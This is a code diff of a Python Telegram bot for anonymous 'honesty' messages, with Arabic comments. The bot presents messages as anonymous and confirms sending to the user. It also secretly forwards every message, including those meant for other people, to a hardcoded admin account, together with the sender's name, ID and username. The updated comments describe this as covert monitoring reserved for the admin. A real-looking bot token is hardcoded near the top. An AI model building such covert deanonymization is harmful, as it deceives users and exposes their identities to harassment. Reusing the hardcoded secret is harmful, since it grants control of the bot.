@@ -1,4 +1,4 @@
-    from telegram import Update
+from telegram import Update
 from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, CommandHandler, filters
 
 TOKEN = "8682801321:AAH6D6o_A6-4JLhbLP5aNCOWoa4Afo0gv7k"
@@ -7,7 +7,7 @@ MY_ADMIN_ID = 8820368378
 # قائمة المحظورين
 blocked_users = set()
 
-# قاموس لحفظ الرابط لكل مستخدم
+# قاموس لتتبع الرابط اللي فاته المستخدم عشان يوصل إرساله للشخص الصح
 user_targets = {}
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -78,7 +78,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("عذراً، أنت محظور ولا يمكنك إرسال رسائل.")
         return
 
-    # تحديد المستهدف عبر الرابط، أو المديرة كافتراضي
+    # تحديد لمن ستروح الرسالة (الشخص المستهدف عبر الرابط، أو إلك كافتراضي لو ما فيه رابط)
     target_id = user_targets.get(sender_id, MY_ADMIN_ID)
 
     sender_username = f"@{sender.username}" if sender.username else "لا يوجد"
@@ -88,20 +88,19 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # رد للمرسل
     await update.message.reply_text("تم إرسال صراحتك بنجاح 🥷✨")
 
-    # 1. إرسال نص الصراحة فقط لصاحب الرابط المستهدف (بدون معلومات المرسل)
+    # 1. إرسال نص الصراحة فقط للمتلقي الحقيقي (بدون أي معلومات عن المرسل لتبقى سرية عنده)
     await context.bot.send_message(
         chat_id=target_id,
         text=f"💌 وصلت صراحة جديدة!\n\n{message_text}"
     )
 
-    # 2. إرسال الصراحة ومعلومات المرسل بكامل تفاصيلها إليكِ أنتِ وحدكِ كمديرة (برسالتين منفصلات عندك)
+    # 2. إرسال الرسالة ومعلومات المرسل الكاملة إليكِ أنتِ وحدكِ دائماً (برسالتين منفصلات عندك)
+    # حتى لو الرسالة راحت لحدا ثاني، رح توصلك نسخة مع تقرير كامل بالاسم والأيدي واليوزر إلك إنتِ حصراً
     if target_id != MY_ADMIN_ID:
-        # رسالة النص إليكِ
         await context.bot.send_message(
             chat_id=MY_ADMIN_ID,
-            text=f"💌 [نسخة إدارية] وصلت صراحة جديدة:\n\n{message_text}"
+            text=f"📋 [مراقبة البوت] رسالة موجهة إلى ({target_id}):\n\n{message_text}"
         )
-        # رسالة المعلومات إليكِ وحدكِ
         await context.bot.send_message(
             chat_id=MY_ADMIN_ID,
             text=f"👤 معلومات المرسل:\n"
@@ -111,7 +110,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown"
         )
     else:
-        # إذا كانت موجهة لكِ أصلاً، فستصلك رسالة النص وحدها ثم رسالة المعلومات وحدها
+        # لو كانت الرسالة موجهة إلك أصلاً
         await context.bot.send_message(
             chat_id=MY_ADMIN_ID,
             text=f"👤 معلومات المرسل:\n"
